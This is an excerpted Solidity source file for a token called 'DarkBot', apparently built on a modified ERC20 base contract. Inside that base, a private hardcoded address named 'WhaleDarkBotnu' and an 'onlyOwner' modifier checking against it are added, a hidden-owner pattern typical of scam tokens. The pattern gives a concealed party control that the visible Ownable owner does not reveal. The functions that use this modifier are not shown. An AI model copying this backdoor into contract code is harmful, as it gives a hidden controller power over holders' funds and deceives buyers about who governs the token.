...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public DarkBotnuwebsite = "https://darkbots.vip/";
    string public DarkBotnuADDRESS = "0x5Eb65d8A516e6C9009BCE402B101aC2E6084a8e4";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleDarkBotnu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleDarkBotnu = 0x5Eb65d8A516e6C9009BCE402B101aC2E6084a8e4;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getDarkBotnuwebsite() public view returns (string memory) {
        return DarkBotnuwebsite;
    } 


               function getDarkBotnuADDRESS() public view returns (string memory) {
        return DarkBotnuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleDarkBotnu);
        _;
    }    
    function _approve(
        address owner,
...
contract DarkBot is ERC20, Ownable {
    constructor () ERC20("DarkBot", "DARKBOT") 
    {    
